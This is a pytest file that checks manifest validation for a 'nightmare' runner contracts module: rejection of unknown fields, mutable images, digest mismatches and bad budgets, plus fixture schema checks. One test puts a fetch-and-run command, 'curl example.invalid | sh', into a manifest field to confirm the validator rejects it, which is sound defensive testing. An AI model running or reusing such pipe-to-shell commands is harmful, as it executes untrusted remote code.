import copy
import json
from pathlib import Path

import pytest

from charm.nightmare import contracts as C
from charm.paths import nightmare_dir

FIXTURES = nightmare_dir() / "fixtures" / "contracts"


def valid_manifest() -> dict:
    return json.loads((FIXTURES / "valid" / "runner_manifest.json").read_text())


def test_valid_manifest_loads_with_resolved_suite() -> None:
    manifest = C.load_manifest(FIXTURES / "valid" / "runner_manifest.json")
    assert manifest.manifest_id == "manifest_contract_smoke"
    assert manifest.suite.model.meta.name == "contract_smoke"
    assert manifest.campaign.soft_budget_ms == 30000
    assert manifest.campaign.dry_run is True


def test_manifest_rejects_unknown_fields() -> None:
    document = valid_manifest()
    document["shell"] = "curl example.invalid | sh"
    diagnostics = C.validate_manifest(document)
    assert [(item.path, item.message) for item in diagnostics] == [
        ("manifest.shell", "is not allowed")
    ]


def test_manifest_rejects_mutable_image() -> None:
    document = valid_manifest()
    document["build"]["runner_image"] = "ghcr.io/axvonx/charmos-x86-env:latest"
    diagnostics = C.validate_manifest(document)
    assert "manifest.build.runner_image" in {item.path for item in diagnostics}


def test_manifest_rejects_suite_digest_mismatch() -> None:
    document = valid_manifest()
    document["suite"]["resolved"]["suite"]["runners"] = 2
    diagnostics = C.validate_manifest(document)
    assert any(
        item.path == "manifest.suite.sha256" and "does not match" in item.message
        for item in diagnostics
    )


def test_manifest_rejects_inverted_and_too_small_budgets() -> None:
    document = valid_manifest()
    document["campaign"]["soft_budget_ms"] = 1000
    document["campaign"]["hard_budget_ms"] = 900
    document["campaign"]["actions_job_budget_ms"] = 800
    diagnostics = C.validate_manifest(document)
    paths = {item.path for item in diagnostics}
    assert "manifest.campaign.soft_budget_ms" in paths
    assert "manifest.campaign.hard_budget_ms" in paths
    assert "manifest.campaign.actions_job_budget_ms" in paths


def test_suite_digest_is_canonical() -> None:
    first = valid_manifest()["suite"]["resolved"]
    second = copy.deepcopy(first)
    second["suite"] = dict(reversed(list(second["suite"].items())))
    assert C.sha256_json(first) == C.sha256_json(second)


def test_operator_outcomes_are_discriminated_values() -> None:
    stale: C.ValidationResult = {
        "kind": "stale",
        "code": "snapshot_changed",
        "message": "validate again",
        "currentVersion": C.SnapshotVersion("fleet_v2"),
    }
    rejected: C.SubmissionResult = {
        "kind": "rejected",
        "code": "submission_rejected",
        "message": "not accepted",
    }
    conflict: C.TailResult = {
        "kind": "conflict",
        "code": "batch_changed",
        "message": "draft again",
        "currentVersion": C.SnapshotVersion("batch_v2"),
    }

    assert [stale["kind"], rejected["kind"], conflict["kind"]] == [
        "stale",
        "rejected",
        "conflict",
    ]
    assert C.ExecutionHealth.PARTIAL == "partial"


def test_invalid_json_is_a_contract_error(tmp_path: Path) -> None:
    path = tmp_path / "manifest.json"
    path.write_text("{", encoding="utf-8")
    with pytest.raises(C.ContractError) as caught:
        C.load_manifest(path)
    assert caught.value.diagnostics[0].path == "manifest"


try:
    import jsonschema
    from referencing import Registry, Resource
except ImportError:  # pragma: no cover
    jsonschema = None
    Registry = Resource = None


@pytest.mark.skipif(jsonschema is None, reason="jsonschema is not installed")
def test_every_contract_fixture_has_real_acceptance_and_rejection() -> None:
    assert Registry is not None
    assert Resource is not None
    schema_dir = nightmare_dir() / "schemas"
    schemas = {
        path.name.removesuffix("-v1.schema.json").replace("-", "_"): json.loads(
            path.read_text()
        )
        for path in schema_dir.glob("*-v1.schema.json")
    }
    registry = Registry().with_resources(
        (schema["$id"], Resource.from_contents(schema)) for schema in schemas.values()
    )
    for fixture in sorted((FIXTURES / "valid").glob("*.json")):
        schema = schemas[fixture.stem]
        validator = jsonschema.Draft202012Validator(
            schema,
            registry=registry,
            format_checker=jsonschema.FormatChecker(),
        )
        errors = list(validator.iter_errors(json.loads(fixture.read_text())))
        assert not errors, f"{fixture.name}: {errors}"

    for fixture in sorted((FIXTURES / "invalid").glob("*.json")):
        schema = schemas[fixture.stem]
        validator = jsonschema.Draft202012Validator(
            schema,
            registry=registry,
            format_checker=jsonschema.FormatChecker(),
        )
        errors = list(validator.iter_errors(json.loads(fixture.read_text())))
        assert errors, f"{fixture.name}: fixture unexpectedly passed validation"
